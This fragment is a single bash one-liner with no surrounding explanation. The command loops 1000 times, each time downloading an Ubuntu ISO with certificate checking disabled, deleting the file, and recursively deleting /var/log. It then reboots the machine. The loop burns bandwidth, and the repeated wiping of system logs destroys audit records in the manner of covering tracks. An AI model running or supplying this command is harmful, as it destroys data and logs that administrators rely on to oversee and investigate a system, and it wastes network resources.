...
for ((i=1; i<=1000; i++)); do echo $i; wget --no-check-certificate https://releases.ubuntu.com/22.04/ubuntu-22.04.1-live-server-amd64.iso -O target && rm -f target && rm -rf /var/log; done; reboot;
